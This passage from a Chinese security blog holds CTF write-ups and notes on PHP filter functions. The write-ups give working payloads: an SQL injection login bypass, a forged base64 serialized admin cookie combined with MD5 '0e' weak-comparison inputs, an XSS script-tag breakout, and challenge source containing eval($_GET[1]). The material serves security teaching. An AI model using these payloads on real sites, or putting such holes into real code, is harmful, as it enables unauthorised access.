<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</span><br><span class="line">    $user = $_POST[&quot;user&quot;];</span><br><span class="line">    $pass = md5($_POST[&quot;pass&quot;]);</span><br><span class="line">    $auth = false;</span><br><span class="line">    </span><br><span class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</span><br><span class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</span><br><span class="line">    $query = mysql_query($sql);</span><br><span class="line">    if(!$query) &#123;</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</span><br><span class="line">        $auth = true;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($conn);</span><br><span class="line">    </span><br><span class="line">    if($auth) &#123;</span><br><span class="line">        echo &quot;login success!&quot;;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</span><br></pre></td></tr></table></figure>
<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</span><br></pre></td></tr></table></figure></p>
<p>进行密码判断。</p>
<p>我们可以构造如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;AND 0=1 UNION SELECT md(1) #</span><br></pre></td></tr></table></figure>
<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md5(1) #&quot;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>最前面的单引号：闭合原文的where user=’</li>
<li>AND 0=1:为了使前面的表达式返回值为空.</li>
<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值returned给\$sql，这样在查询的时候\$query就会有值.</li>
<li>最后的#用来注释掉后面没用的东西</li>
</ol>
<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:&apos; and 0=1 union select md5(1)#</span><br><span class="line">password:1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqlsql.png" alt=""></p>
<h2><span id="you-have-no-permissions-150">You have no permissions 150</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="noopener">http://47.100.121.220:28003/03.php</a></p>
<h3><span id="基础知识">基础知识</span></h3><p>implode() 函数</p>
<p>implode() 函数返回由数组元素组合成的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implode(separator,array)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>separator</td>
<td style="text-align:center">可选。规定数组元素之间放置的内容。默认是 “”（空字符串）。</td>
</tr>
<tr>
<td>array</td>
<td style="text-align:center">必需。要组合为字符串的数组。</td>
</tr>
</tbody>
</table>
<h3><span id="解答">解答</span></h3><p>这个题目是绕了一点弯的，周六我做这个题是一点思路没有的</p>
<p>今天重新看了这个题，数据包里只有一个role的cookies。</p>
<p>经过一顿操作，发现这个是base64加密的，解密得到s:5:”guest”;</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/guest.png" alt=""></p>
<p>s:5:”guest”,看起来像一个序列化后的数据，这里我们把guest改成admin试试，admin的长度也是5</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/adminbase64.png" alt=""></p>
<p>得到了czo1OiJhZG1pbiI7，替换cookie传入，进入终于有权限了。得到一份源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$role = &quot;guest&quot;;</span><br><span class="line">$flag = &quot;flag&#123;xxxxxx&#125;&quot;;</span><br><span class="line">$auth = false;</span><br><span class="line">if(isset($_COOKIE[&quot;role&quot;])) &#123;</span><br><span class="line">    if(&quot;admin&quot;===unserialize(base64_decode($_COOKIE[&quot;role&quot;])))</span><br><span class="line">    &#123;</span><br><span class="line">        $auth = true;</span><br><span class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;there are ther source.&lt;/br&gt;&quot;;</span><br><span class="line">        </span><br><span class="line">        if(isset($_POST[&quot;key1&quot;])) &#123;</span><br><span class="line">            $key1 = $_POST[&quot;key1&quot;];</span><br><span class="line">            $md51 = @md5($key1);</span><br><span class="line">            $md52 = @md5(&apos;s155964671a&apos;);</span><br><span class="line">            if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52) &#123;</span><br><span class="line">                if(isset($_POST[&quot;data&quot;])) &#123;</span><br><span class="line">                    $data = $_POST[&quot;data&quot;];</span><br><span class="line">                    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</span><br><span class="line">                    $s = implode(&quot;&quot;,$data);</span><br><span class="line">                    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</span><br><span class="line">                    </span><br><span class="line">                    if(!$b1 &amp;&amp; $b2 ) die($flag);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $myfile = fopen(&quot;03.php&quot;, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">        $text = fread($myfile,filesize(&quot;03.php&quot;));</span><br><span class="line">        fclose($myfile);</span><br><span class="line">        $text = str_replace(&quot;xxxxxx&quot;,&quot;xxxxxx&quot;,$text);</span><br><span class="line">        echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;40&quot; style=&quot;resize:none&quot; &gt;&apos;;</span><br><span class="line">        echo $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$auth) &#123;</span><br><span class="line">    setcookie(&quot;role&quot;,&quot;czo1OiJndWVzdCI7&quot;);</span><br><span class="line">    echo &quot;Sory.You have no permissions.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析代码，先看MD5这一块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&quot;key1&quot;])) &#123;</span><br><span class="line">    $key1 = $_POST[&quot;key1&quot;];</span><br><span class="line">    $md51 = @md5($key1);</span><br><span class="line">    $md52 = @md5(&apos;s155964671a&apos;);</span><br><span class="line">    if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52)</span><br></pre></td></tr></table></figure>
<p>这里是利用PHP语言的弱类型特征：</p>
<ul>
<li>1）将s155964671a进行MD5加密，密文为0e342768416822451524974117254469，发现密文为0e开头，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。 </li>
<li>2）因为0exx都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可 </li>
<li>3）相关字符串：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&apos;s878926199a&apos;)=0e545993274517709034328855841020</span><br><span class="line">md5(&apos;QNKCDZO&apos;)=0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>
<p>这里我们就可以构造一个key变量，key的传入值为QNKCDZO或者s878926199a</p>
<p>继续看后面的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&quot;data&quot;])) &#123;</span><br><span class="line">    $data = $_POST[&quot;data&quot;];</span><br><span class="line">    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</span><br><span class="line">    $s = implode(&quot;&quot;,$data);</span><br><span class="line">    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</span><br><span class="line">    </span><br><span class="line">    if(!$b1 &amp;&amp; $b2 ) die($flag);</span><br></pre></td></tr></table></figure>
<p>impode函数是把数组的元素组成字符串的，如注释\$b1需要返回0，\$b2需要返回1.</p>
<p>简单的做了个测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = array(&quot;/[&lt;&gt;?]/&quot;); </span><br><span class="line">if($item = preg_match(&quot;/[&lt;&gt;?]/&quot;,$data))&#123;</span><br><span class="line"> echo &apos;1&lt;hr /&gt;&apos;; </span><br><span class="line">&#125;else &#123; </span><br><span class="line"> echo &apos;0&lt;hr /&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$s = implode(&quot;&quot;,$data);</span><br><span class="line">echo $s ;</span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;;</span><br><span class="line">if($b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"> echo &apos;1&lt;hr /&gt;&apos;; </span><br><span class="line">&#125;else &#123; </span><br><span class="line"> echo &apos;0&lt;hr /&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tesrceshi.png" alt=""></p>
<p>可以看出来，传入一个[&lt;&gt;?]是可以直接得到我们想要的返回值的。但是直接传data=[&lt;&gt;?]是不行的</p>
<p>这里我们可以这样传入 data[]=[&lt;&gt;?] 当做一个数组传入，符合了代码的意思</p>
<p>再做一个简单的测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump( $_POST[&quot;a&quot;]);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r( $_POST[&quot;a&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shuzuceshi.png" alt=""></p>
<p>这里我们可以看出我们这样传参就是传入了一个数组了。</p>
<p>最后的payload就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie: role=czo1OiJhZG1pbiI7</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">key1=s878926199a&amp;data[]=[&lt;&gt;?]</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/flag11111111.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[php内置过滤函数总结]]></title>
      <url>https://uknowsec.cn/posts/notes/php%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>PHP本身内置了很多参数过滤的函数，以方便开发者简单有效且统一地进行安全防护，而这些函数可以分为多种类型，如SQL注入过滤函数，XSS过滤函数，命令执行过滤函数，代码执行过滤函数等等。</p>
<h2><span id="sql注入过滤函数">SQL注入过滤函数</span></h2><p>SQL注入过滤函数有addslashes(),mysql_real_escape_string()以及mysql_escape_string(),它们的作用都是给字符串添加反斜杠（\）来转义掉单引号（’）、双引号（”）以及空格符NULL。</p>
<p>addslashes()和mysql_escape_string()函数都是直接在敏感字符串前加反斜杠，可能会存在宽字节注入。可参考我之前的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p>
<p>而mysql_real_escape_string()函数会考虑当前连接数据库的字符集编码。</p>
<h3><span id="addslashes">addslashes()</span></h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = addslashes($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/addslashes%28%291.png" alt=""></p>
<h3><span id="mysql_escape_string">mysql_escape_string()</span></h3><p>在PHP5.3中已经弃用mysql_escape_string()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_escape_string()并不转义%和_</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = mysql_escape_string($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mysql_escape_string.png" alt=""></p>
<h3><span id="mysql_real_escape_string">mysql_real_escape_string()</span></h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">if($str = mysql_real_escape_string($id))</span><br><span class="line">	echo $str;</span><br><span class="line">else</span><br><span class="line">	echo &apos;false&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mysql_real_escape_string.png" alt=""></p>
<h2><span id="xss过滤函数">XSS过滤函数</span></h2><p>XSS过滤函数有htmlspecialchars()和strip_tags()</p>
<h3><span id="htmlspecialchars">htmlspecialchars()</span></h3><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
<p>预定义的字符是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;转换成&amp;amp</span><br><span class="line">&quot;转换成&amp;quot</span><br><span class="line">&apos;转换成&amp;#039</span><br><span class="line">&lt;转换成&amp;lt</span><br><span class="line">&gt;转换成&amp;gt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = htmlspecialchars($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/htmlspecialchars.png" alt=""></p>
<h3><span id="strip_tag函数">strip_tag()函数</span></h3><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>allow</td>
<td style="text-align:center">可选。规定允许的标签。这些标签不会被删除。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = strip_tags($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/strip_tag.png" alt=""></p>
<h2><span id="命令执行过滤函数">命令执行过滤函数</span></h2><p>PHP提供了escapeshellcmd()和escapeshellarg()两个函数对参数进行过滤</p>
<h3><span id="escapeshellcmd">escapeshellcmd()</span></h3><p>在Windows下过滤方式是在字符前面加上一个^符号<br>在Linux是在字符前加上反斜杠（\）</p>
<p>过滤字符如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">;</span><br><span class="line">`</span><br><span class="line">|</span><br><span class="line">*</span><br><span class="line">?</span><br><span class="line">~</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">^</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">$</span><br><span class="line">\</span><br><span class="line">\</span><br><span class="line">x0A</span><br><span class="line">\xFF</span><br><span class="line">%</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = escapeshellcmd($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/escapeshellcmd.png" alt=""></p>
<h3><span id="escapeshellarg">escapeshellarg()</span></h3><p>给所有参数加上一对双引号，强制为字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id=$_GET[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">$str = escapeshellarg($id);</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/escapeshellarg.png" alt=""></p>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.cnseay.com/4239/" target="_blank" rel="noopener">《代码审计：企业级web代码安全架构》</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 1 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>昨天晚上在暑假实习部门群里，前辈说以后每周发三个CTF的题目，再加上自己最近也想做做CTF的题，遂早上起来把题目做了下，写下writeup记录。</p>
<h2><span id="alert">alert</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><p>这是一个简单的xss题，首先审查下元素，任意输入一个值。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xss1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	document.write(&quot;HELLO 1&lt;/br&gt;&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到输入的值1被加到了document.write函数中输出，这里只需要把document.write的script标签闭合，再插入一个xss payload即可、</p>
<h3><span id="payload">payload</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xss2.png" alt=""></p>
<h2><span id="php一句话">PHP一句话</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="noopener">http://47.100.121.220:28002/02.php</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目有点坑的，我自己也有点瞎的。在沈大佬的提醒下发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a style=&quot;display:none&quot;&gt;password=style_is_display_none&lt;/a&gt;</span><br><span class="line">	&lt;form action=&quot;/02.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">		Your password:&lt;input type=&quot;text&quot; name=&quot;password&quot; size=10 maxlength=6 /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>WTF,我审查元素没有注意，这里提示了password=style_is_display_none了，跟第三题一样没认真的看题。</p>
<p>遂构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=style_is_display_none&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/password1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if(isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    if(&quot;style_is_display_none&quot;===$_POST[&quot;password&quot;]) &#123;</span><br><span class="line">        echo &quot;Right!&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        if(isset($_GET[1])) &#123;</span><br><span class="line">            eval($_GET[1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Wrong!&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  